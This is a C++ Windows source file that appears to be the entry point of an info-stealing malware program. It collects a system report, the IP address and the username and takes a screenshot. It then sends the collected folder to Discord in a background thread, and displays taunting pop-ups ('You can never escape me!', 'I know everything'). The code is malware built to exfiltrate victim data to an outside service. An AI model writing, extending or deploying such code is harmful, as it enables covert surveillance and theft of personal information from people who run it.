#include <windows.h>
#include <iostream>
#include "UserInfo.h"
#include "SystemReport.h"
#include "CreateFolder.h"
#include "IPReport.h"
#include "FolderSender.h"
#include "Screenshot.h"
#include <thread>

int main()
{   
    
    SetProcessDPIAware();
    CreateFolderAtUserLocation();
    GenerateSystemReport();
    WriteIPReport();     

    std::wstring username = GetCurrentUsername();

    //get username
    std::wstring chromeFolder = L"C:\\Users\\" + username + L"\\Desktop\\GoogleChrome\\";

    //Take 1st SS  
    TakeScreenshot(L"screen1.bmp");

    //send to discord
    std::thread DiscordThread(SendFolderToDiscord);

    //display image
    AllowSetForegroundWindow(ASFW_ANY);
    ShellExecute(
        NULL,
        L"open",
        L"https://png.pngtree.com/png-clipart/20250118/original/pngtree-golden-retriever-dog-pictures-png-image_20183713.png",
        NULL,
        NULL,
        SW_MAXIMIZE
    );

    //Show warnings
    MessageBox(
        NULL,
        L"You can never escape me! :D!",
        L"NoEscape!",
        MB_OK | MB_ICONWARNING
    );
    //show warnings
    MessageBox(
        NULL,
        L"I know everything :>!",
        L"NoEscape",
        MB_OK | MB_ICONWARNING
    );

    return 0;
}
